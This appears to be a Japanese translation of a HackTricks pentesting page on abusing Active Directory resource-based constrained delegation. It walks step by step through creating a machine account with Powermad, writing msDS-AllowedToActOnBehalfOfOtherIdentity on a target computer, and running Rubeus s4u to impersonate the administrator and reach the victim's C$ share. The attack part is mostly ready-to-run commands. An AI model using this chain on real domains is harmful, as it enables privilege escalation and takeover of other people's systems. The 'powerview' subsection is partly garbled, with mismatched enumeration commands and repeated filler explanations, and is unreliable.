# リソースベースの制約付き委任

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## リソースベースの制約付き委任の基礎

これは、基本的な[制約付き委任](constrained-delegation.md)と似ていますが、**オブジェクトに対して任意のユーザーをなりすます権限を与える**代わりに、リソースベースの制約付き委任では、**オブジェクトに対して任意のユーザーをなりすますことができるユーザー**を設定します。

この場合、制約付きオブジェクトには、_**msDS-AllowedToActOnBehalfOfOtherIdentity**_という属性があり、それに対して任意の他のユーザーをなりすますことができるユーザーの名前が記載されています。

この制約付き委任と他の委任とのもう一つの重要な違いは、**マシンアカウントに対して書き込み権限**（_GenericAll/GenericWrite/WriteDacl/WritePropertyなど）を持つ任意のユーザーが_**msDS-AllowedToActOnBehalfOfOtherIdentity**_を設定できることです（他の委任の形式では、ドメイン管理者特権が必要でした）。

### 新しい概念

制約付き委任では、ユーザーの_userAccountControl_値の中にある**`TrustedToAuthForDelegation`**フラグが**S4U2Self**を実行するために必要であると言われていました。しかし、それは完全な真実ではありません。

実際には、その値がなくても、**サービス**（SPNを持っている）であれば、**任意のユーザーに対してS4U2Self**を実行することができます。ただし、**`TrustedToAuthForDelegation`**を持っている場合、返されるTGSは**Forwardable**になりますが、そのフラグを持っていない場合、返されるTGSは**Forwardable**ではありません。

ただし、**TGS**が**Forwardable**でない場合、**基本的な制約付き委任**を悪用しようとしても**機能しません**。しかし、**リソースベースの制約付き委任を悪用**しようとする場合は機能します（これは脆弱性ではなく、機能のようです）。

### 攻撃の構造

> **コンピュータ**アカウントに**書き込みに相当する特権**がある場合、そのマシンで**特権アクセス**を取得できます。

攻撃者が既に**被害者コンピュータ**に対して**書き込みに相当する特権**を持っていると仮定します。

1. 攻撃者は、**SPN**を持つアカウントを**侵害**するか、**作成**します（"Service A"）。注意：**特別な特権を持たない**_管理者ユーザー_でも、最大で10個の**コンピュータオブジェクト（MachineAccountQuota）**を作成し、それらにSPNを設定することができます。したがって、攻撃者は単にコンピュータオブジェクトを作成し、SPNを設定することができます。
2. 攻撃者は、被害者コンピュータ（ServiceB）に対する**書き込み特権**を悪用して、**リソースベースの制約付き委任を設定**し、ServiceAがその被害者コンピュータ（ServiceB）に対して**任意のユーザーをなりすます**ことを許可します。
3. 攻撃者はRubeusを使用して、Service AからService Bへの**完全なS4U攻撃**（S4U2SelfおよびS4U2Proxy）を実行します。この攻撃は、Service Bに特権アクセスを持つユーザーに対して行われます。
1. S4U2Self（侵害/作成されたアカウントのSPNから）：**AdministratorのTGSを自分に要求**します（Forwardableではない）。
2. S4U2Proxy：前のステップでの**ForwardableでないTGS**を使用して、**Administratorから被害者ホスト**への**TGS**を要求します。
3. ForwardableでないTGSを使用している場合でも、リソースベースの制約付き委任を悪用しているため、機能します。
4. 攻撃者は**チケットを渡す**ことができ、ユーザーを**なりすまして被害者のServiceBにアクセス**できます。

ドメインの_**MachineAccountQuota**_を確認するには、次のコマンドを使用できます：
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻撃

### コンピュータオブジェクトの作成

ドメイン内でコンピュータオブジェクトを作成することができます。[powermad](https://github.com/Kevin-Robertson/Powermad)を使用します。
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../.gitbook/assets/b1.png)
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### R**esource-based Constrained Delegationの設定**

**activedirectory PowerShellモジュールを使用する**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerviewを使用する**

```plaintext
Get-DomainUser -TrustedToAuth
```

このコマンドは、信頼された認証を受けるユーザーの一覧を取得します。これにより、制約付き委任の潜在的な攻撃対象を特定することができます。

```plaintext
Get-DomainComputer -TrustedToAuth
```

このコマンドは、信頼された認証を受けるコンピューターの一覧を取得します。これにより、制約付き委任の潜在的な攻撃対象を特定することができます。

```plaintext
Get-DomainGroup -TrustedToAuth
```

このコマンドは、信頼された認証を受けるグループの一覧を取得します。これにより、制約付き委任の潜在的な攻撃対象を特定することができます。

```plaintext
Get-DomainUser -TrustedToAuth | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.ObjectType -match 'computer'} | select IdentityReference,ActiveDirectoryRights,InheritanceFlags,IsInherited,ObjectType | ft -AutoSize
```

このコマンドは、信頼された認証を受けるユーザーの一覧を取得し、関連するACL情報を表示します。これにより、制約付き委任の潜在的な攻撃対象を特定することができます。

```plaintext
Get-DomainComputer -TrustedToAuth | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.ObjectType -match 'user'} | select IdentityReference,ActiveDirectoryRights,InheritanceFlags,IsInherited,ObjectType | ft -AutoSize
```

このコマンドは、信頼された認証を受けるコンピューターの一覧を取得し、関連するACL情報を表示します。これにより、制約付き委任の潜在的な攻撃対象を特定することができます。

```plaintext
Get-DomainGroup -TrustedToAuth | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.ObjectType -match 'user'} | select IdentityReference,ActiveDirectoryRights,InheritanceFlags,IsInherited,ObjectType | ft -AutoSize
```

このコマンドは、信頼された認証を受けるグループの一覧を取得し、関連するACL情報を表示します。これにより、制約付き委任の潜在的な攻撃対象を特定することができます。
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 完全なS4U攻撃の実行

まず、パスワード`123456`を持つ新しいコンピュータオブジェクトを作成しましたので、そのパスワードのハッシュが必要です：
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
これにより、そのアカウントのRC4およびAESハッシュが表示されます。\
さて、攻撃を実行できます:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeusの`/altservice`パラメータを使用して、一度の要求で複数のチケットを生成することができます。
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
ユーザーには「**委任できない**」という属性があります。ユーザーがこの属性をTrueに設定している場合、彼をなりすますことはできません。このプロパティはBloodhound内で確認できます。
{% endhint %}

![](../../.gitbook/assets/B3.png)

### アクセス

最後のコマンドラインは、**完全なS4U攻撃を実行し、TGSを管理者から被害者ホストに**インジェクトします。\
この例では、管理者から**CIFS**サービスのTGSが要求されたため、**C$**にアクセスできます。
```bash
ls \\victim.domain.local\C$
```
![](../../.gitbook/assets/b4.png)

### 異なるサービスチケットの悪用

[**ここで利用可能なサービスチケットについて学ぶ**](silver-ticket.md#available-services)。

## Kerberosエラー

* **`KDC_ERR_ETYPE_NOTSUPP`**: これは、KerberosがDESまたはRC4を使用しないように設定されており、あなたが単にRC4ハッシュを提供していることを意味します。少なくともAES256ハッシュをRubeusに提供してください（または単にrc4、aes128、aes256ハッシュを提供してください）。例：`[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: これは、現在のコンピュータの時刻がDCの時刻と異なっており、Kerberosが正常に動作していないことを意味します。
* **`preauth_failed`**: これは、指定したユーザ名+ハッシュがログインに使用されていないことを意味します。ハッシュを生成する際にユーザ名に"$"を入れ忘れた可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
* **`KDC_ERR_BADOPTION`**: これは次のことを意味する場合があります：
* あなたがなりすますことを試みているユーザは、望ましいサービスにアクセスできない（なりすますことができないか、十分な特権を持っていないため）
* 要求されたサービスが存在しない（winrmのチケットを要求するが、winrmが実行されていない場合など）
* 作成されたfakecomputerが脆弱なサーバー上で特権を失い、それを戻す必要がある

## 参考文献

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
